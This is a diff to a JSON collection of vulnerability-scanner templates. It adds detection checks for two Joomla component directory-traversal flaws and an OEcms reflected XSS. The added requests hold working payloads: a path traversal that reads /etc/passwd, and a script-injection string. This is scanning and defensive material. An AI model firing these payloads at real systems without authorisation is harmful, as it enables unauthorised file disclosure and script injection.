@@ -728,6 +728,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1306",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Picasa (com_joomlapicasa2) component 2.0 and 2.0.5 for Joomla! allows remote attackers to read arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Picasa 2.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12058",
+          "https://www.cvedetails.com/cve/CVE-2010-1306"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1314",
       "info": {
         "author": "daffainfo",
@@ -1254,6 +1291,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_multimap&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1954",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the iNetLanka Multiple root (com_multiroot) component 1.0 and 1.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component iNetLanka Multiple root 1.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12287",
+          "https://www.cvedetails.com/cve/CVE-2010-1954"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_multiroot&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -8336,6 +8410,52 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/cgi-bin/login?LD_DEBUG=files"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-12095",
+      "info": {
+        "author": "LogicalHunter",
+        "description": "A Reflected Cross-Site Scripting web vulnerability has been discovered in the OEcms v3.1 web-application. The vulnerability is located in the mod parameter of info.php.",
+        "name": "OEcms 3.1 - Cross-Site Scripting",
+        "reference": [
+          "https://www.exploit-db.com/exploits/44895",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12095",
+          "https://cxsecurity.com/issue/WLB-2018060092"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2018,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cms/info.php?mod=list%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -24383,11 +24503,14 @@
           },
           "matchers": [
             {
+              "condition": "and",
               "part": "body",
-              "regex": [
-                "(EXPONENT\\.(?:(?:J(?:QUERY|S)_UR|URL_FUL)|YUI2_UR)L=\")?https?://{{randstr}}\\.tld"
-              ],
-              "type": "regex"
+              "type": "word",
+              "words": [
+                "{{randstr}}.tld",
+                "EXPONENT.PATH",
+                "EXPONENT.URL"
+              ]
             },
             {
               "status": [
@@ -24399,8 +24522,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/",
-            "{{BaseURL}}/login/showlogin"
+            "{{BaseURL}}"
           ]
         }
       ]
